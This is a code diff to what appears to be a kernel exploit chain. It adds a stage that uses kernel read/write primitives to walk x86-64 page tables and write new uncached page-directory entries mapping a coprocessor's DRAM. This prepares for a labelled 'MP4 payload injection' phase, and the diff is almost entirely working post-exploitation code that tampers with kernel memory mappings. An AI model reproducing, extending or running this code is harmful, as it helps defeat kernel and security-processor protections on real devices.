@@ -210,6 +210,134 @@ int prosperous_run(void)
     }
     printf("[+] TMR 20 disabled, TMR 21 created\n");
 
+    /* Phase 1.5: Ensure DMAP mapping for MP4 DRAM (PA 0x60000000) */
+    printf("\n[*] Phase 1.5: Checking DMAP page tables for MP4 DRAM...\n");
+    {
+        uint64_t dmap = ctx.dmap_base;
+        uint64_t target_va = dmap + MP4_DRAM_BASE;
+        uint32_t pml4_idx = (target_va >> 39) & 0x1FF;
+        uint32_t pdpt_idx = (target_va >> 30) & 0x1FF;
+        uint32_t pd_idx   = (target_va >> 21) & 0x1FF;
+
+        printf("[*] DMAP VA for DRAM: 0x%lx\n", target_va);
+        printf("[*] Indices: PML4[0x%x] PDPT[0x%x] PD[0x%x]\n",
+               pml4_idx, pdpt_idx, pd_idx);
+
+        /* Walk PML4 */
+        uint64_t pml4e;
+        kernel_copyout(dmap + ctx.kpml4_pa + pml4_idx * 8, &pml4e, 8);
+        printf("[DIAG] PML4[0x%x] = 0x%016lx %s\n", pml4_idx, pml4e,
+               (pml4e & 1) ? "PRESENT" : "NOT PRESENT");
+
+        if (pml4e & 1) {
+            uint64_t pdpt_pa = pml4e & 0xFFFFFFFFFF000ULL;
+
+            /* Walk PDPT */
+            uint64_t pdpte;
+            kernel_copyout(dmap + pdpt_pa + pdpt_idx * 8, &pdpte, 8);
+            printf("[DIAG] PDPT[0x%x] = 0x%016lx %s%s\n", pdpt_idx, pdpte,
+                   (pdpte & 1) ? "PRESENT" : "NOT PRESENT",
+                   (pdpte & (1 << 7)) ? " 1GB-PAGE" : "");
+
+            if ((pdpte & 1) && !(pdpte & (1 << 7))) {
+                uint64_t pd_pa = pdpte & 0xFFFFFFFFFF000ULL;
+
+                /* Walk PD - check entries covering DRAM range */
+                for (int i = 0; i < 5; i++) {
+                    uint32_t idx = pd_idx + i;
+                    uint64_t pde;
+                    kernel_copyout(dmap + pd_pa + idx * 8, &pde, 8);
+                    uint64_t mapped_pa = pde & 0xFFFFFFFFFF000ULL;
+                    if (pde & (1 << 7)) /* 2MB page */
+                        mapped_pa = pde & 0xFFFFFFFE00000ULL;
+                    printf("[DIAG] PD[0x%x] = 0x%016lx %s%s (PA 0x%lx)\n",
+                           idx, pde,
+                           (pde & 1) ? "P" : "NP",
+                           (pde & (1 << 7)) ? " 2MB" : "",
+                           mapped_pa);
+                }
+
+                /* Create missing 2MB PDE entries for DRAM range */
+                int created = 0;
+                /* Cover PA 0x60000000 - 0x607FFFFF (4x 2MB pages) */
+                for (int i = 0; i < 4; i++) {
+                    uint32_t idx = pd_idx + i;
+                    uint64_t pde;
+                    kernel_copyout(dmap + pd_pa + idx * 8, &pde, 8);
+                    if (!(pde & 1)) {
+                        uint64_t page_pa = MP4_DRAM_BASE + (uint64_t)i * 0x200000;
+                        uint64_t new_pde = page_pa |
+                                           (1ULL << 0) |  /* Present */
+                                           (1ULL << 1) |  /* RW */
+                                           (1ULL << 4) |  /* PCD (cache disable) */
+                                           (1ULL << 5) |  /* Accessed */
+                                           (1ULL << 6) |  /* Dirty */
+                                           (1ULL << 7);   /* PS (2MB page) */
+                        kernel_copyin(&new_pde, dmap + pd_pa + idx * 8, 8);
+                        printf("[+] Created PD[0x%x] = 0x%016lx (PA 0x%lx, 2MB UC)\n",
+                               idx, new_pde, page_pa);
+                        created++;
+                    }
+                }
+
+                /* Also cover the payload area (DRAM + 0x7F1000) */
+                uint32_t payload_pd_idx =
+                    ((MP4_DRAM_BASE + MP4_PAYLOAD_OFFSET) >> 21) & 0x1FF;
+                if (payload_pd_idx > pd_idx + 3) {
+                    uint64_t pde;
+                    kernel_copyout(dmap + pd_pa + payload_pd_idx * 8, &pde, 8);
+                    if (!(pde & 1)) {
+                        uint64_t page_pa =
+                            (MP4_DRAM_BASE + MP4_PAYLOAD_OFFSET) & ~0x1FFFFFULL;
+                        uint64_t new_pde = page_pa |
+                                           (1ULL << 0) | (1ULL << 1) |
+                                           (1ULL << 4) | (1ULL << 5) |
+                                           (1ULL << 6) | (1ULL << 7);
+                        kernel_copyin(&new_pde, dmap + pd_pa + payload_pd_idx * 8, 8);
+                        printf("[+] Created PD[0x%x] = 0x%016lx (PA 0x%lx, 2MB UC)\n",
+                               payload_pd_idx, new_pde, page_pa);
+                        created++;
+                    }
+                }
+
+                if (created > 0) {
+                    printf("[+] Created %d DMAP PDE entries for MP4 DRAM\n",
+                           created);
+                    /* Verify access works now */
+                    uint32_t test_val = 0xDEADDEAD;
+                    int32_t rc = kernel_copyout(dmap + MP4_DRAM_BASE,
+                                                &test_val, sizeof(test_val));
+                    printf("[DIAG] DRAM[0] after PDE fix: 0x%08x (rc=%d)\n",
+                           test_val, rc);
+                }
+            } else if ((pdpte & 1) && (pdpte & (1 << 7))) {
+                /* 1GB page - DRAM region IS mapped but likely WB cached.
+                 * We need to split into 2MB pages to set PCD on just DRAM. */
+                printf("[!] DRAM is inside a 1GB page - needs split for UC\n");
+
+                uint64_t gb_pa = pdpte & 0xFFFFFFC0000000ULL;
+                uint64_t gb_flags = pdpte & 0xFFF;
+                printf("[*] 1GB page maps PA 0x%lx, flags 0x%lx\n",
+                       gb_pa, gb_flags);
+
+                /* Splitting 1GB into 2MB pages requires allocating a PD page.
+                 * For now, just set PCD on the entire 1GB as workaround. */
+                printf("[!] Trying PCD on entire 1GB page as workaround...\n");
+
+                uint64_t new_pdpte = pdpte | (1ULL << 4); /* Set PCD */
+                kernel_copyin(&new_pdpte, dmap + pdpt_pa + pdpt_idx * 8, 8);
+                printf("[*] Set PCD on PDPT[0x%x]: 0x%016lx\n",
+                       pdpt_idx, new_pdpte);
+
+                uint32_t test_val = 0xDEADDEAD;
+                int32_t rc = kernel_copyout(dmap + MP4_DRAM_BASE,
+                                            &test_val, sizeof(test_val));
+                printf("[DIAG] DRAM[0] after PCD fix: 0x%08x (rc=%d)\n",
+                       test_val, rc);
+            }
+        }
+    }
+
     /* Phase 2: MP4 payload injection */
     printf("\n[*] Phase 2: MP4 payload injection...\n");
 
